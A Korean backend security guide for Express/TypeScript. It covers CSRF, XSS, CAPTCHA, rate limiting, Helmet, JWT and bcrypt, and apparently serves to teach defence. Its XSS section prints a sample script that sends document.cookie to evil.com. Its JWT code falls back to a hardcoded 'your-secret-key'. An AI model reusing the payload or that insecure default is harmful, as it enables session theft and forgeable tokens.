# 백엔드 보안 가이드

## 🔒 보안 항목 설명 및 구현 방법

---

## 1. CSRF (Cross-Site Request Forgery) 공격 방어

### 📖 설명
**CSRF란?**
- 사용자가 로그인한 상태에서 악의적인 웹사이트가 사용자 몰래 요청을 보내는 공격
- 예: 사용자가 로그인한 상태에서 악성 링크를 클릭하면, 그 사이트가 사용자 대신 요청을 보냄

**예시 시나리오:**
```
1. 사용자가 은행 사이트에 로그인 (쿠키에 세션 저장)
2. 악성 사이트 방문
3. 악성 사이트가 사용자 몰래 은행에 송금 요청 전송
4. 은행은 사용자의 쿠키로 인식하여 송금 실행 😱
```

### 🛡️ 방어 방법
**CSRF Token 사용**
- 서버가 고유한 토큰을 생성하여 클라이언트에 전달
- 모든 POST/PUT/DELETE 요청에 이 토큰을 포함해야 함
- 서버는 요청의 토큰을 검증

**구현:**
```typescript
// csrf.middleware.ts
import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';

// CSRF 토큰 생성
export const generateCSRFToken = (): string => {
  return crypto.randomBytes(32).toString('hex');
};

// CSRF 토큰 검증 미들웨어
export const verifyCSRFToken = (req: Request, res: Response, next: NextFunction) => {
  const token = req.headers['x-csrf-token'];
  const sessionToken = req.session?.csrfToken;
  
  if (!token || token !== sessionToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
};
```

---

## 2. XSS (Cross-Site Scripting) 공격 방어

### 📖 설명
**XSS란?**
- 악성 스크립트를 웹사이트에 삽입하여 사용자의 브라우저에서 실행하는 공격
- 사용자의 쿠키, 세션 정보 등을 탈취할 수 있음

**예시:**
```html
<!-- 악성 사용자가 입력한 댓글 -->
<script>
  // 사용자의 쿠키를 악성 서버로 전송
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

### 🛡️ 방어 방법
1. **입력 데이터 검증 및 Sanitization**
   - 사용자 입력을 검증하고 위험한 문자 제거
2. **출력 시 이스케이프**
   - HTML 특수문자를 이스케이프 처리
3. **Content Security Policy (CSP) 헤더**
   - 허용된 스크립트만 실행되도록 제한

**구현:**
```typescript
// xss.middleware.ts
import { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';

// Helmet으로 기본 XSS 방어
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
}));

// 입력 데이터 Sanitization
import DOMPurify from 'isomorphic-dompurify';

export const sanitizeInput = (input: string): string => {
  return DOMPurify.sanitize(input, { 
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [] 
  });
};
```

---

## 3. 캡챠 (CAPTCHA)

### 📖 설명
**캡챠란?**
- "Completely Automated Public Turing test to tell Computers and Humans Apart"
- 봇과 사람을 구분하는 테스트
- 로그인, 회원가입, 댓글 작성 등에서 봇 공격 방지

**사용 시나리오:**
- 회원가입 시 봇 가입 방지
- 로그인 시무차 시도 방지
- 댓글 스팸 방지

### 🛡️ 구현 방법
**Google reCAPTCHA v3 사용 (추천)**
- 사용자가 문제를 풀 필요 없이 백그라운드에서 점수로 판단
- 점수가 낮으면 추가 검증 요구

**구현:**
```typescript
// captcha.middleware.ts
import axios from 'axios';

export const verifyCaptcha = async (token: string): Promise<boolean> => {
  const secretKey = process.env.RECAPTCHA_SECRET_KEY;
  const response = await axios.post(
    'https://www.google.com/recaptcha/api/siteverify',
    null,
    {
      params: {
        secret: secretKey,
        response: token,
      },
    }
  );
  
  // 점수가 0.5 이상이면 통과
  return response.data.success && response.data.score >= 0.5;
};

// 사용 예시
router.post('/register', async (req, res) => {
  const { captchaToken } = req.body;
  
  const isValid = await verifyCaptcha(captchaToken);
  if (!isValid) {
    return res.status(400).json({ error: 'Captcha verification failed' });
  }
  
  // 회원가입 로직...
});
```

---

## 4. 프록시 공격 방어 (Rate Limiting)

### 📖 설명
**프록시 공격이란?**
- 여러 IP나 프록시를 통해 대량의 요청을 보내는 공격
- DDoS 공격, 무차별 대입 공격(Brute Force) 등
- 서버 과부하 유발

**예시:**
```
공격자가 1000개의 프록시를 통해 동시에 로그인 시도
→ 서버 다운 또는 다른 사용자 접근 차단
```

### 🛡️ 방어 방법
**Rate Limiting (요청 제한)**
- IP별, 사용자별로 일정 시간 내 요청 횟수 제한
- 예: IP당 1분에 10번만 요청 허용

**구현:**
```typescript
// rate-limit.middleware.ts
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// 일반 API Rate Limiting
export const apiLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
  }),
  windowMs: 15 * 60 * 1000, // 15분
  max: 100, // 최대 100번 요청
  message: 'Too many requests from this IP, please try again later.',
});

// 로그인 Rate Limiting (더 엄격)
export const loginLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
  }),
  windowMs: 15 * 60 * 1000, // 15분
  max: 5, // 최대 5번만 시도
  skipSuccessfulRequests: true,
  message: 'Too many login attempts, please try again after 15 minutes.',
});
```

---

## 5. 기본 잠금 (기본 보안 설정)

### 📖 설명
**기본 보안 설정이란?**
- 모든 웹 애플리케이션에 기본적으로 적용해야 하는 보안 설정
- 헤더 설정, HTTPS 강제, 쿠키 보안 등

### 🛡️ 구현 방법
**Helmet.js 사용 (추천)**
- 보안 헤더를 자동으로 설정해주는 라이브러리

**구현:**
```typescript
// security.middleware.ts
import helmet from 'helmet';
import express from 'express';

const app = express();

// Helmet으로 기본 보안 설정
app.use(helmet({
  // XSS 방어
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
  // 클릭재킹 방어
  frameguard: { action: 'deny' },
  // MIME 타입 스니핑 방어
  noSniff: true,
  // XSS 필터
  xssFilter: true,
}));

// HTTPS 강제 (프로덕션)
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      res.redirect(`https://${req.header('host')}${req.url}`);
    } else {
      next();
    }
  });
}
```

---

## 6. 토큰 (JWT)

### 📖 설명
**JWT (JSON Web Token)란?**
- 사용자 인증 정보를 담은 암호화된 토큰
- 서버에 세션을 저장하지 않고 토큰으로 인증
- Stateless 인증 방식

**구조:**
```
Header.Payload.Signature
예: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0In0.signature
```

**장점:**
- 서버 확장성 좋음 (세션 저장소 불필요)
- 모바일 앱에도 적합
- 분산 시스템에 유리

### 🛡️ 구현 방법
```typescript
// jwt.service.ts
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d';

// 토큰 생성
export const generateToken = (userId: string, email: string): string => {
  return jwt.sign(
    { userId, email },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRES_IN }
  );
};

// 토큰 검증
export const verifyToken = (token: string): any => {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch (error) {
    throw new Error('Invalid token');
  }
};

// 미들웨어
export const authenticateToken = (req: Request, res: Response, next: NextFunction) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  try {
    const decoded = verifyToken(token);
    req.user = decoded; // 사용자 정보를 request에 추가
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
};
```

**보안 고려사항:**
- 토큰을 HTTP-only 쿠키에 저장 (XSS 방어)
- Refresh Token 사용 (Access Token 만료 시 갱신)
- 토큰 블랙리스트 관리 (로그아웃 시)

---

## 7. 비밀번호 해시 (Password Hashing)

### 📖 설명
**비밀번호 해시란?**
- 비밀번호를 평문으로 저장하지 않고 해시 함수로 암호화하여 저장
- 해시는 단방향 함수 (복호화 불가능)
- 같은 비밀번호는 항상 같은 해시값 생성

**왜 필요한가?**
- 데이터베이스 유출 시에도 비밀번호를 알 수 없음
- 관리자도 사용자 비밀번호를 알 수 없음

**해시 vs 암호화:**
```
암호화: 복호화 가능 (양방향)
해시: 복호화 불가능 (단방향)
```

### 🛡️ 구현 방법
**bcrypt 사용 (추천)**
- Salt를 자동으로 생성하여 같은 비밀번호도 다른 해시값 생성
- Rainbow Table 공격 방어

**구현:**
```typescript
// password.service.ts
import bcrypt from 'bcryptjs';

const SALT_ROUNDS = 12; // 해시 강도 (높을수록 안전하지만 느림)

// 비밀번호 해시 생성
export const hashPassword = async (password: string): Promise<string> => {
  const salt = await bcrypt.genSalt(SALT_ROUNDS);
  return await bcrypt.hash(password, salt);
};

// 비밀번호 검증
export const verifyPassword = async (
  password: string,
  hashedPassword: string
): Promise<boolean> => {
  return await bcrypt.compare(password, hashedPassword);
};

// 사용 예시
// 회원가입
const hashedPassword = await hashPassword('userPassword123');
await userRepository.create({ email, password: hashedPassword });

// 로그인
const user = await userRepository.findByEmail(email);
const isValid = await verifyPassword(password, user.password);
if (!isValid) {
  throw new Error('Invalid password');
}
```

**보안 고려사항:**
- Salt Rounds는 10-12 권장 (너무 높으면 느림)
- 평문 비밀번호는 절대 로그에 남기지 않기
- 비밀번호 정책 강제 (최소 길이, 특수문자 등)

---

## 📋 전체 보안 미들웨어 통합

```typescript
// server.ts
import express from 'express';
import helmet from 'helmet';
import { apiLimiter, loginLimiter } from './middleware/rate-limit.middleware';
import { authenticateToken } from './middleware/auth.middleware';

const app = express();

// 1. 기본 보안 설정
app.use(helmet());

// 2. Rate Limiting
app.use('/api/', apiLimiter);
app.use('/api/auth/login', loginLimiter);

// 3. Body Parser
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// 4. CORS 설정
app.use(cors({
  origin: process.env.CORS_ORIGIN,
  credentials: true,
}));

// 5. 보호된 라우트에 인증 미들웨어 적용
app.use('/api/protected', authenticateToken);

// 6. 라우트
app.use('/api/auth', authRoutes);
app.use('/api/protected', protectedRoutes);
```

---

## 🔐 보안 체크리스트

- [ ] CSRF 토큰 검증
- [ ] XSS 방어 (입력 검증, 출력 이스케이프)
- [ ] 캡챠 적용 (회원가입, 로그인)
- [ ] Rate Limiting 설정
- [ ] Helmet으로 기본 보안 헤더 설정
- [ ] JWT 토큰 인증 구현
- [ ] 비밀번호 해시 (bcrypt)
- [ ] HTTPS 강제 (프로덕션)
- [ ] 환경 변수로 민감 정보 관리
- [ ] SQL Injection 방어 (ORM 사용)
- [ ] 로그에 민감 정보 기록하지 않기
- [ ] 정기적인 보안 업데이트

---

## 📚 추가 보안 항목

### SQL Injection 방어
- ORM 사용 (Prisma, TypeORM 등)
- Prepared Statements 사용

### 환경 변수 관리
- `.env` 파일을 `.gitignore`에 추가
- 프로덕션에서는 환경 변수 관리 서비스 사용

### 로깅 및 모니터링
- 보안 이벤트 로깅
- 이상 징후 감지 및 알림

---

**이 가이드를 참고하여 백엔드 보안을 단계적으로 구현하세요!**

